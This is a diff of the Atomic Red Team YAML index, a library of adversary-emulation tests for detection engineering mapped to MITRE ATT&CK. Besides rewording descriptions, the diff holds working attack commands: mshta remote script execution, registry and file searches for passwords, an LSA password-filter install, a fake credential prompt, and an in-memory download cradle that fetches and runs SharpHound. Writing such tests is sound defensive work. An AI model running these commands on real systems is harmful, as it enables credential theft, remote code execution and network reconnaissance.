@@ -10216,9 +10216,10 @@ defense-evasion:
       identifier: T1170
     atomic_tests:
     - name: Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject
-      description: |
-        Test execution of a remote script using mshta.exe
-        Upon execution calc.exe will be launched
+      description: 'Test execution of a remote script using mshta.exe. Upon execution
+        calc.exe will be launched.
+
+'
       supported_platforms:
       - windows
       input_arguments:
@@ -10232,38 +10233,24 @@ defense-evasion:
         command: 'mshta.exe javascript:a=(GetObject(''script:#{file_url}'')).Exec();close();
 
 '
-    - name: Mshta calls a local VBScript file to launch notepad.exe
-      description: Tests execution of a local program by a VBScript file called by
-        Mshta
-      supported_platforms:
-      - windows
-      input_arguments:
-        local_file_path:
-          description: Create a local VBScript file
-          type: path
-          default: C:\Temp\mshta_notepad.vbs
-      executor:
-        name: command_prompt
-        command: 'mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run(""#{local_file_path}"")(window.close)")
-
-'
     - name: Mshta executes VBScript to execute malicious command
       description: |
-        Run a local VB script to run local user enumeration powershell command
-
+        Run a local VB script to run local user enumeration powershell command.
         This attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.
+        Upon execution, a new PowerShell windows will be opened that displays user information.
       supported_platforms:
       - windows
       executor:
         name: command_prompt
         command: 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell
-          -noexit -file $PathToAtomicsFolder\T1170\src\powershell.ps1"":close")
+          -noexit -file PathToAtomicsFolder\T1170\src\powershell.ps1"":close")
 
 '
     - name: Mshta Executes Remote HTML Application (HTA)
-      description: |
-        Execute an arbitrary remote HTA.
-        Upon execution calc.exe will be launched
+      description: 'Execute an arbitrary remote HTA. Upon execution calc.exe will
+        be launched.
+
+'
       supported_platforms:
       - windows
       input_arguments:
@@ -12309,10 +12296,9 @@ defense-evasion:
 
 '
     - name: SyncAppvPublishingServer Signed Script PowerShell Command Execution
-      description: 'Executes the signed SyncAppvPublishingServer script with options
-        to execute an arbitrary PowerShell command.
-
-'
+      description: |
+        Executes the signed SyncAppvPublishingServer script with options to execute an arbitrary PowerShell command.
+        Upon execution, calc.exe will be launched.
       supported_platforms:
       - windows
       input_arguments:
@@ -17285,22 +17271,21 @@ discovery:
 
 '
     - name: List Google Chrome Bookmarks on Windows with powershell
-      description: 'Searches for Google Chromes''s Bookmarks file (on Windows distributions)
-        that contains bookmarks.
-
-'
+      description: |
+        Searches for Google Chromes's Bookmarks file (on Windows distributions) that contains bookmarks.
+        Upon execution, paths that contain bookmark files will be displayed.
       supported_platforms:
       - windows
       executor:
         name: powershell
-        command: 'where.exe /R C:\Users\ Bookmarks
+        command: 'Get-ChildItem -Path C:\Users\ -Filter Bookmarks -Recurse -ErrorAction
+          SilentlyContinue -Force
 
 '
-    - name: List Google Chrome Bookmarks on Windows with command prompt
-      description: 'Searches for Google Chromes''s Bookmarks file (on Windows distributions)
-        that contains bookmarks.
-
-'
+    - name: List Google Chrome Bookmarks on Windows with command prompt.
+      description: |
+        Searches for Google Chromes's Bookmarks file (on Windows distributions) that contains bookmarks.
+        Upon execution, paths that contain bookmark files will be displayed.
       supported_platforms:
       - windows
       executor:
@@ -18920,7 +18905,8 @@ discovery:
       identifier: T1082
     atomic_tests:
     - name: System Information Discovery
-      description: 'Identify System Info
+      description: 'Identify System Info. Upon execution, system info and time info
+        will be displayed.
 
 '
       supported_platforms:
@@ -18993,7 +18979,8 @@ discovery:
           sudo lsmod | grep -i "virtio_pci\|virtio_net"
           sudo lsmod | grep -i "hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc"
     - name: Hostname Discovery (Windows)
-      description: 'Identify system hostname for Windows.
+      description: 'Identify system hostname for Windows. Upon execution, the hostname
+        of the device will be displayed.
 
 '
       supported_platforms:
@@ -19018,7 +19005,8 @@ discovery:
 
 '
     - name: Windows MachineGUID Discovery
-      description: 'Identify the Windows MachineGUID value for a system.
+      description: 'Identify the Windows MachineGUID value for a system. Upon execution,
+        the machine GUID will be displayed from registry.
 
 '
       supported_platforms:
@@ -20737,7 +20725,8 @@ credential-access:
 
 '
     - name: Extracting passwords with findstr
-      description: 'Extracting Credentials from Files
+      description: 'Extracting Credentials from Files. Upon execution, the contents
+        of files that contain the word "password" will be displayed.
 
 '
       supported_platforms:
@@ -20749,18 +20738,17 @@ credential-access:
           findstr /si pass *.xml *.doc *.txt *.xls
           ls -R | select-string -Pattern password
     - name: Access unattend.xml
-      description: 'Attempts to access unattend.xml, where credentials are commonly
-        stored, within the Panther directory where installation logs are stored.
-
-'
+      description: |
+        Attempts to access unattend.xml, where credentials are commonly stored, within the Panther directory where installation logs are stored.
+        If these files exist, their contents will be displayed. They are used to store credentials/answers during the unattended windows install process.
       supported_platforms:
       - windows
       executor:
         name: command_prompt
         elevation_required: true
         command: |
-          type C:\Windows\Panther\unattend.xml > nul 2>&1
-          type C:\Windows\Panther\Unattend\unattend.xml > nul 2>&1
+          type C:\Windows\Panther\unattend.xml
+          type C:\Windows\Panther\Unattend\unattend.xml
   T1214:
     technique:
       x_mitre_permissions_required:
@@ -20813,7 +20801,8 @@ credential-access:
       identifier: T1214
     atomic_tests:
     - name: Enumeration for Credentials in Registry
-      description: 'Queries to enumerate for credentials in the Registry.
+      description: 'Queries to enumerate for credentials in the Registry. Upon execution,
+        any registry key containing the word "password" will be displayed.
 
 '
       supported_platforms:
@@ -20825,9 +20814,9 @@ credential-access:
           reg query HKLM /f password /t REG_SZ /s
           reg query HKCU /f password /t REG_SZ /s
     - name: Enumeration for PuTTY Credentials in Registry
-      description: 'Queries to enumerate for PuTTY credentials in the Registry.
-
-'
+      description: |
+        Queries to enumerate for PuTTY credentials in the Registry. PuTTY must be installed for this test to work. If any registry
+        entries are found, they will be displayed.
       supported_platforms:
       - windows
       executor:
@@ -21150,7 +21139,7 @@ credential-access:
 '
     - name: PowerShell - Prompt User for Password
       description: |
-        Prompt User for Password (Local Phishing) as seen in Stitch RAT.
+        Prompt User for Password (Local Phishing) as seen in Stitch RAT. Upon execution, a window will appear for the user to enter their credentials.
 
         Reference: https://github.com/nathanlopez/Stitch/blob/master/PyLib/askpass.py
       supported_platforms:
@@ -21515,7 +21504,7 @@ credential-access:
       executor:
         name: powershell
         elevation_required: true
-        command: |-
+        command: |
           $passwordFilterName = (Copy-Item "#{input_dll}" -Destination "C:\Windows\System32" -PassThru).basename
           $lsaKey = Get-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
           $notificationPackagesValues = $lsaKey.GetValue("Notification Packages")
@@ -21586,10 +21575,7 @@ credential-access:
       executor:
         name: command_prompt
         elevation_required: true
-        command: |
-          echo "ATOMICREDTEAM" > %windir%\cert.key
-          dir c:\ /b /s .key | findstr /e .key
-        cleanup_command: 'del c:\Windows\cert.key >nul 2>&1
+        command: 'dir c:\ /b /s .key | findstr /e .key
 
 '
     - name: Discover Private SSH Keys
@@ -23182,9 +23168,10 @@ execution:
       identifier: T1170
     atomic_tests:
     - name: Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject
-      description: |
-        Test execution of a remote script using mshta.exe
-        Upon execution calc.exe will be launched
+      description: 'Test execution of a remote script using mshta.exe. Upon execution
+        calc.exe will be launched.
+
+'
       supported_platforms:
       - windows
       input_arguments:
@@ -23198,38 +23185,24 @@ execution:
         command: 'mshta.exe javascript:a=(GetObject(''script:#{file_url}'')).Exec();close();
 
 '
-    - name: Mshta calls a local VBScript file to launch notepad.exe
-      description: Tests execution of a local program by a VBScript file called by
-        Mshta
-      supported_platforms:
-      - windows
-      input_arguments:
-        local_file_path:
-          description: Create a local VBScript file
-          type: path
-          default: C:\Temp\mshta_notepad.vbs
-      executor:
-        name: command_prompt
-        command: 'mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run(""#{local_file_path}"")(window.close)")
-
-'
     - name: Mshta executes VBScript to execute malicious command
       description: |
-        Run a local VB script to run local user enumeration powershell command
-
+        Run a local VB script to run local user enumeration powershell command.
         This attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.
+        Upon execution, a new PowerShell windows will be opened that displays user information.
       supported_platforms:
       - windows
       executor:
         name: command_prompt
         command: 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell
-          -noexit -file $PathToAtomicsFolder\T1170\src\powershell.ps1"":close")
+          -noexit -file PathToAtomicsFolder\T1170\src\powershell.ps1"":close")
 
 '
     - name: Mshta Executes Remote HTML Application (HTA)
-      description: |
-        Execute an arbitrary remote HTA.
-        Upon execution calc.exe will be launched
+      description: 'Execute an arbitrary remote HTA. Upon execution calc.exe will
+        be launched.
+
+'
       supported_platforms:
       - windows
       input_arguments:
@@ -23359,13 +23332,14 @@ execution:
           Invoke-Mimikatz -DumpCreds"
 
 '
-    - name: SharpHound
-      description: "Upon execution SharpHound will downloaded and executed. It will
-        set up collection methods, run and then compress and store the data to the
-        temp directory on the machine. If system is unable to contact a domain, proper
-        execution will not occur.\n\nSuccessful execution will produce stdout reporting
-        LDAP connection was successful and BloodHound domain enumeration is occurring.
-        Upon completion, final output will be a *BloodHound.zip file. \n"
+    - name: Run BloodHound from local disk
+      description: "Upon execution SharpHound will be downloaded to disk, imported
+        and executed. It will set up collection methods, run and then compress and
+        store the data to the temp directory on the machine. If system is unable to
+        contact a domain, proper execution will not occur.\n\nSuccessful execution
+        will produce stdout reporting LDAP connection was successful and BloodHound
+        domain enumeration is occurring. Upon completion, final output will be a *BloodHound.zip
+        file. \n"
       supported_platforms:
       - windows
       input_arguments:
@@ -23376,32 +23350,51 @@ execution:
         file_path:
           description: File path for SharpHound payload
           type: String
-          default: PathToAtomicsFolder\T1086\payloads
+          default: PathToAtomicsFolder\T1086\src
         output_path:
           description: Output path for BloodHound reports
           type: String
-          default: PathToAtomicsFolder\T1086\payloads
+          default: PathToAtomicsFolder\T1086\src
       dependency_executor_name: powershell
       dependencies:
       - description: 'Validate if SharpHound.ps1 is located in #{file_path}.'
         prereq_command: 'if (Test-Path #{file_path}\SharpHound.ps1) {exit 0} else
           {exit 1}'
-        get_prereq_command: Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/SharpHound.ps1"
+        get_prereq_command: Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1"
           -OutFile "#{file_path}\SharpHound.ps1"
       executor:
         name: powershell
         elevation_required: true
-        command: "write-host \"Test 1 - Import and Execution of SharpHound.ps1 from
-          #{file_path}\" -ForegroundColor Cyan\nimport-module #{file_path}\\SharpHound.ps1;
-          invoke-bloodhound -domain #{internal_domain} -OutputDirectory #{output_path}\nwrite-host
-          \"Test 2 - Remote download of SharpHound.ps1, import and execution from
-          $env:temp\" -ForegroundColor Cyan\nInvoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/SharpHound.ps1
-          -outfile $env:temp\\SharpHound.ps1; import-module $env:temp\\SharpHound.ps1;
-          invoke-bloodhound -domain #{internal_domain} -OutputDirectory #{output_path}\n
-          \n"
+        command: "write-host \"Import and Execution of SharpHound.ps1 from #{file_path}\"
+          -ForegroundColor Cyan\nimport-module #{file_path}\\SharpHound.ps1; invoke-bloodhound
+          -domain #{internal_domain} -OutputDirectory #{output_path}\n \n"
         cleanup_command: |
+          Remove-Item #{file_path}\SharpHound.ps1 -Force
           Remove-Item #{file_path}\*BloodHound.zip -Force
-          Remove-Item $env:temp\SharpHound.ps1 -Force
+    - name: Run Bloodhound from Memory using Download Cradle
+      description: "Upon execution SharpHound will load into memory and execute against
+        a domain. It will set up collection methods, run and then compress and store
+        the data to #{output_path}. If system is unable to contact a domain, proper
+        execution will not occur.\n\nSuccessful execution will produce stdout reporting
+        LDAP connection was successful and BloodHound domain enumeration is occurring.
+        Upon completion, final output will be a *BloodHound.zip file. \n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        output_path:
+          description: Output path for BloodHound reports
+          type: String
+          default: PathToAtomicsFolder\T1086\src
+      executor:
+        name: powershell
+        elevation_required: true
+        command: "write-host \"Remote download of SharpHound.ps1, import and execution
+          from $env:temp\" -ForegroundColor Cyan\npowershell -exec Bypass -C \"IEX(New-Object
+          Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');Invoke-BloodHound
+          -OutputDirectory #{output_path}\"\n \n"
+        cleanup_command: 'Remove-Item #{output_path}\*BloodHound.zip -Force
+
+'
     - name: Obfuscation Tests
       description: |
         Different obfuscated methods to test
@@ -23464,7 +23457,7 @@ execution:
         url:
           description: url of payload to execute
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/test.ps1
       executor:
         name: command_prompt
         elevation_required: false
@@ -23477,14 +23470,14 @@ execution:
       description: |
         Powershell MsXml COM object. Not proxy aware, removing cache although does not appear to write to those locations. Upon execution, "Download Cradle test success!" will be displayed.
 
-        Provided by https://github.com/mgreen27/mgreen27.github.i
+        Provided by https://github.com/mgreen27/mgreen27.github.io
       supported_platforms:
       - windows
       input_arguments:
         url:
           description: url of payload to execute
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/test.ps1
       executor:
         name: command_prompt
         elevation_required: false
@@ -23504,7 +23497,7 @@ execution:
         url:
           description: url of payload to execute
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.xml
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/test.xml
       executor:
         name: command_prompt
         elevation_required: false
@@ -23524,7 +23517,7 @@ execution:
         url:
           description: url of payload to execute
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/mshta.sct
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/mshta.sct
       executor:
         name: command_prompt
         elevation_required: false
@@ -24828,10 +24821,9 @@ execution:
 
 '
     - name: SyncAppvPublishingServer Signed Script PowerShell Command Execution
-      description: 'Executes the signed SyncAppvPublishingServer script with options
-        to execute an arbitrary PowerShell command.
-
-'
+      description: |
+        Executes the signed SyncAppvPublishingServer script with options to execute an arbitrary PowerShell command.
+        Upon execution, calc.exe will be launched.
       supported_platforms:
       - windows
       input_arguments:
@@ -25292,7 +25284,7 @@ execution:
     atomic_tests:
     - name: OSTap Style Macro Execution
       description: |
-        This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. The .jse file in turn launches wscript.exe.
+        This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. Upon execution, the .jse file launches wscript.exe.
         Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
 
         This is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns
@@ -25360,7 +25352,7 @@ execution:
 '
     - name: Maldoc choice flags command execution
       description: |
-        This Test uses a VBA macro to execute cmd with flags observed in recent maldoc and 2nd stage downloaders
+        This Test uses a VBA macro to execute cmd with flags observed in recent maldoc and 2nd stage downloaders. Upon execution, CMD will be launched.
         Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
       supported_platforms:
       - windows
@@ -25396,6 +25388,7 @@ execution:
     - name: OSTAP JS version
       description: |
         Malicious JavaScript executing CMD which spawns wscript.exe //e:jscript
+
         Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
       supported_platforms:
       - windows
